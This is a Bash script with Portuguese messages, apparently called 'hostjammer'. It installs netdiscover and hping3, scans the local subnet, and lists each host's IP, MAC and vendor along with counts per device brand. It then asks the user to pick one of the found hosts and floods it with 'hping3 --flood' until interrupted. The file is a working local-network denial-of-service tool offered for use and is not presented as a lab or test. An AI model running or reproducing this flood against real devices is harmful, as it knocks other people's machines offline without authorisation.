#!/bin/bash

function CHECK_DEPENDECIAS {
  NETTOOLS=`sudo dpkg-query -l | grep net-tools | wc -l`
  NETDISCOVER=`sudo dpkg-query -l | grep netdiscover | wc -l`
  HPING3=`sudo dpkg-query -l | grep hping3 | wc -l`
  if [[ $NETTOOLS -eq 0 ]]; then
    echo -e "Instalando net-tools\n"
    sudo apt install net-tools
    echo
  fi
  if [[ $NETDISCOVER -eq 0 ]]; then
    echo -e "Instalando netdiscover\n"
    sudo apt install netdiscover
    echo
  fi
  if [[ $HPING3 -eq 0 ]]; then
    echo -e "Instalando hping3\n"
    sudo apt install hping3
    echo
  fi
}

function CHECK_ROOT {
  if [[ ! $USER = "root" ]]; then
    echo "Execute como root."
    exit
  fi
}

function CHECK_LOG_DIR {
  LOG_DIR=./logs
  if [[ ! -d $LOG_DIR ]]; then
    sudo mkdir ./logs
  fi
}

function GET_INTERFACES {
  INTERFACES=( $(sudo ifconfig | grep "<UP,BROADCAST,RUNNING,MULTICAST>" | awk -F ": " '{print $1}') )
  LEN_INTERFACES=${#INTERFACES[@]}

  if [[ $LEN_INTERFACES = 1 ]]; then
    INTERFACE=${INTERFACES[0]}
    echo "Única interface disponível: $INTERFACE"
  else
    echo "Escolha a interface:"
    echo

    for (( i = 0; i < $LEN_INTERFACES; i++ )); do
      echo "$i - ${INTERFACES[$i]}"
    done

    echo
    echo -n "Escolha: "
    read N_INTERFACE

    if [[ $N_INTERFACE -ge $LEN_INTERFACES ]] || [[ $N_INTERFACE -lt 0 ]]; then
      echo "Opção inválida."
      exit
    fi
    echo
    INTERFACE=${INTERFACES[$N_INTERFACE]}
    echo "Você escolheu $INTERFACE"

  fi
}

function GET_ESCOPO {
  ESCOPO=$(sudo ip route | grep "$INTERFACE" | grep "kernel scope link src" | awk -F " " '{print $1}')
  IP=$(echo "$ESCOPO" | awk -F "/" '{print $1}')
  MASK=$(echo "$ESCOPO" | awk -F "/" '{print $2}')
  echo "Escopo da rede: $ESCOPO"


  POT=$((32 - $MASK))
  IP_NUMBER=$(((2 ** $POT) - 1 ))
  echo "Número de IP's possíveis: $IP_NUMBER"
}

function RUN_SCAN {
  sudo netdiscover -r $ESCOPO -P > $LOG_DIR/hostjammer-result-inicial.txt
  N_LINHAS=$(cat $LOG_DIR/hostjammer-result-inicial.txt | wc -l)
  CORTE_LINHAS=$(($N_LINHAS - 2))
  CORTE_LINHAS2=$(($CORTE_LINHAS - 3))
  N_HOSTS=$(cat $LOG_DIR/hostjammer-result-inicial.txt | grep found | awk -F ", " '{print $2}' | awk -F " " '{print $1}')
  echo "Número de IP's encontrados: $N_HOSTS"
}

function CLEAN_LOGS {
  sudo rm -rf $LOG_DIR/*
}

function BUILD_DATA {
  echo
  echo "OPÇÃO|IP|MAC|FABRICANTE" > $LOG_DIR/hostjammer-result-cabecalho.txt
  cat $LOG_DIR/hostjammer-result-inicial.txt | head -n $CORTE_LINHAS | tail -n $CORTE_LINHAS2 | sed 's/ /%/g' | awk -F "%" '{print $2}' > $LOG_DIR/hostjammer-result-ip.txt
  cat $LOG_DIR/hostjammer-result-inicial.txt | head -n $CORTE_LINHAS | tail -n $CORTE_LINHAS2 | sed 's/ /%/g' | awk -F "%%%%%" '{print $2}' > $LOG_DIR/hostjammer-result-mac.txt
  cat $LOG_DIR/hostjammer-result-inicial.txt | head -n $CORTE_LINHAS | tail -n $CORTE_LINHAS2 | sed 's/ /%/g' | awk -F "%%%%%%1%%%%%%" '{print $2}' | awk -F "%%" '{print $2}' | sed 's/%/ /g' > $LOG_DIR/hostjammer-result-fabricante.txt
  cat -n $LOG_DIR/hostjammer-result-ip.txt | awk -F " " '{print $1,"|",$2}' | sed 's/ //g' > $LOG_DIR/hostjammer-result-ip-final.txt
  paste $LOG_DIR/hostjammer-result-ip-final.txt $LOG_DIR/hostjammer-result-mac.txt $LOG_DIR/hostjammer-result-fabricante.txt -d "|" > $LOG_DIR/hostjammer-result-final.txt && sed -i 's/%//g' $LOG_DIR/hostjammer-result-final.txt
  cat $LOG_DIR/hostjammer-result-cabecalho.txt $LOG_DIR/hostjammer-result-final.txt | column -s"|" -t | sed 's/%//g'
  cat $LOG_DIR/hostjammer-result-cabecalho.txt $LOG_DIR/hostjammer-result-final.txt | column -s"|" -t | sed 's/%//g' > $LOG_DIR/scan-hostjammer.txt
  cat $LOG_DIR/hostjammer-result-inicial.txt | head -n $CORTE_LINHAS | tail -n $CORTE_LINHAS2 | awk -F " " '{print $1}' > $LOG_DIR/hostjammer-result-filtrado-escolha-ip.txt
  echo
  echo "Relatório: "
  echo
  MICROSOFT=$(cat $LOG_DIR/scan-hostjammer.txt | grep "Microsoft" | wc -l)
  MOTOROLA=$(cat $LOG_DIR/scan-hostjammer.txt | grep "Motorola" | wc -l)
  SAMSUNG=$(cat $LOG_DIR/scan-hostjammer.txt | grep "Samsung" | wc -l)
  XIAOMI=$(cat $LOG_DIR/scan-hostjammer.txt | grep "Xiaomi" | wc -l)
  ASUS=$(cat $LOG_DIR/scan-hostjammer.txt | grep "ASUSTek" | wc -l)
  APPLE=$(cat $LOG_DIR/scan-hostjammer.txt | grep "Apple" | wc -l)
  LG=$(cat $LOG_DIR/scan-hostjammer.txt | grep "LG" | wc -l)
  OUTROS=$(cat $LOG_DIR/scan-hostjammer.txt | grep -v "LG" | grep -v "Apple" | grep -v "ASUSTek" | grep -v "Xiaomi" | grep -v "Samsung" | grep -v "Motorola" | grep -v "Microsoft" | wc -l)
  OUTROS=$(( $OUTROS - 1 ))
  echo "Microsoft: $MICROSOFT"
  echo "Motorola:  $MOTOROLA"
  echo "Samsung:   $SAMSUNG"
  echo "Xiaomi:    $XIAOMI"
  echo "Apple:     $APPLE"
  echo "Asus:      $ASUS"
  echo "LG:        $LG"
  echo
  echo "Outros:    $OUTROS"
  echo
}

function FLOOD_IP {
  echo -n "Deseja inundar algum IP? (s/n): "
  read RESPOSTA_ENVENENAR

  while [[ ! "$RESPOSTA_ENVENENAR" = s ]] && [[ ! "$RESPOSTA_ENVENENAR" = n ]]
  do
    echo "Opção inválida."
    echo -n "Digite sim ou não. (s/n): "
    read RESPOSTA_ENVENENAR
  done

  if [[ ! "$RESPOSTA_ENVENENAR" = "s" ]]; then
    exit
  fi

  read -p "Escolha uma opção: " N_LINHA_ESCOLHA_IP
  ALVO=`sed "$N_LINHA_ESCOLHA_IP !d" $LOG_DIR/hostjammer-result-filtrado-escolha-ip.txt`
  echo -e "O IP escolhido foi: $ALVO"

  echo -e "Inundando $ALVO. Digite ctrl+c pra sair."

  FLOOD=$(sudo hping3 $ALVO --flood -q 2> /dev/null )
  echo "$FLOOD"
  exit
}

CHECK_ROOT
CHECK_DEPENDECIAS
CHECK_LOG_DIR
GET_INTERFACES
GET_ESCOPO
RUN_SCAN
BUILD_DATA
FLOOD_IP

CLEAN_LOGS
